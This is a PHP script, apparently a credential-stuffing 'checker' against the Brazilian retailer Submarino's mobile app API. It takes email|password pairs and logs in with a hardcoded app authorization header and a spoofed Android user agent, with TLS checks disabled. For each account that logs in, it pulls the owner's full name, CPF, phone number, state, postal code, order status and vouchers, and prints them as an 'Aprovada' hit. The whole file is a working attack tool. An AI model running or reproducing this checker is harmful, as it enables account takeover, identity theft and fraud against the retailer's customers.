<?php
error_reporting(0);
set_time_limit(0);

$get = $_GET['list'];
$split = explode("|",$get);
$email = $split[0];
$pwd = $split[1];



function fausto($string,$start,$end){
	$str = explode($start,$string);
	$str = explode($end,$str[1]);
	return $str[0];
}


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://sacola.submarino.com.br/api/v1/customer-token?c_prime=false&c_b2wSid=jywautem&c_salesSolution=APP');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_NOBODY, false);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
curl_setopt($ch,CURLOPT_HTTPHEADER,array(
'X-Action: Origin: Login Dialog',
'Authorization: Basic YXBwYW5kcm9pZHN1YmE6SE4xWW1FNg==',
'User-Agent: suba-android-3.0.0-310000567',
'Content-Type: application/vnd.login.b2w+json',
'Content-Length: 55',
'Host: sacola.submarino.com.br',
'Connection: Keep-Alive',
'Accept-Encoding: gzip',
'Cookie: b2wDevice=eyJvcyI6Im5pbCIsIm9zVmVyc2lvbiI6Im5pbCIsInZlbmRvciI6Im5pbCIsInR5cGUiOiJtb2JpbGUiLCJta3ROYW1lIjoibmlsIiwibW9kZWwiOiJuaWwiLCJtb2JpbGVPcHRPdXQiOiJmYWxzZSJ9; b2wDeviceType=mobile'

,));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIESESSION, false );
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"password":"'.$pwd.'","login":"'.$email.'"}');

$data = curl_exec($ch);



$token = fausto($data, 'token":"', '"');
$id = fausto($data, 'id":"', '"');

curl_setopt($ch, CURLOPT_URL, 'https://sacola.submarino.com.br/api/v6/customer/'.$id);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
curl_setopt($ch,CURLOPT_HTTPHEADER,array(
'X-Action: Origin: Login',
'access-token:' .$token,
'Authorization: Basic YXBwYW5kcm9pZHN1YmE6SE4xWW1FNg==',
'User-Agent: suba-android-3.0.0-310000567',
'Host: sacola.submarino.com.br',
'Connection: Keep-Alive',
'Accept-Encoding: gzip',
'Cookie: b2wDevice=eyJvcyI6Im5pbCIsIm9zVmVyc2lvbiI6Im5pbCIsInZlbmRvciI6Im5pbCIsInR5cGUiOiJtb2JpbGUiLCJta3ROYW1lIjoibmlsIiwibW9kZWwiOiJuaWwiLCJtb2JpbGVPcHRPdXQiOiJmYWxzZSJ9; b2wDeviceType=mobile'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$data1 = curl_exec($ch);




curl_setopt($ch, CURLOPT_URL, 'https://sacola.submarino.com.br/api/v6/customer/'.$id.'/address');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
curl_setopt($ch,CURLOPT_HTTPHEADER,array(
'X-Action: Origin: My Account',
'access-token:' .$token,
'Authorization: Basic YXBwYW5kcm9pZHN1YmE6SE4xWW1FNg==',
'User-Agent: suba-android-3.0.0-310000567',
'Host: sacola.submarino.com.br',
'Connection: Keep-Alive',
'Accept-Encoding: gzip',
'Cookie: b2wDevice=eyJvcyI6Im5pbCIsIm9zVmVyc2lvbiI6Im5pbCIsInZlbmRvciI6Im5pbCIsInR5cGUiOiJtb2JpbGUiLCJta3ROYW1lIjoibmlsIiwibW9kZWwiOiJuaWwiLCJtb2JpbGVPcHRPdXQiOiJmYWxzZSJ9; b2wDeviceType=mobile'

));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$data3 = curl_exec($ch);


curl_setopt($ch, CURLOPT_URL, 'https://my-account-bff-submarino.b2w.io/order-info?customerId='.$id.'&token='.$token.'&offset=1&limit=5');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
curl_setopt($ch,CURLOPT_HTTPHEADER,array(
'accept: application/json, text/plain, */*',
'cache-control: no-cache',
'Host: my-account-bff-submarino.b2w.io',
'Connection: Keep-Alive',
'Accept-Encoding: gzip',
'User-Agent: okhttp/3.11.0'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$data4 = curl_exec($ch);



if(strpos($data4, 'ORDER_INCLUDED')){
	$pedi = 'Sim';
}
else{
	$pedi = 'Não';
}


curl_setopt($ch, CURLOPT_URL, 'https://my-account-bff-submarino.b2w.io/voucher-info?customerId='.$id.'&token='.$token.'&offset=1&limit=5');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
curl_setopt($ch,CURLOPT_HTTPHEADER,array(
'accept: application/json, text/plain, */*',
'cache-control: no-cache',
'Host: my-account-bff-americanas.b2w.io',
'Connection: Keep-Alive',
'Accept-Encoding: gzip',
'User-Agent: okhttp/3.11.0'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$data2 = curl_exec($ch);

if(strpos($data2, 'status":"disponivel"')){
	$vale = 'Sim';
}
else{
	$vale = 'Não';
}



$nome = fausto($data1, 'fullName":"', '"');
$cria = fausto($data1, 'creationDate":"', '"');
$ddd = fausto($data1, 'ddd":"', '"');
$tele = fausto($data1, 'number":"', '"');
$cpf = fausto($data1, 'cpf":"', '"');
$estado = fausto($data3, 'state":"', '"');
$zip = fausto($data3, 'zipCode":"', '"');


if(strpos($data, 'token')){
	echo '✔️Aprovada '.$email.'|'.$pwd.' | Nome: '.$nome.' | CPF: '.$cpf.' | Telefone: '.$ddd.' '.$tele.' | Estado: '.$estado.' | CEP: '.$zip.' | Pedidos: '.$pedi.' | Vales: '.$vale.' | Data de Criação: '.$cria.' | @alex';
}
else{
	echo 'Reprovada '.$email.'|'.$pwd.'|@alex';
}











unlink('cookie.txt');
unlink('cookie.txt');
ob_flush();






?>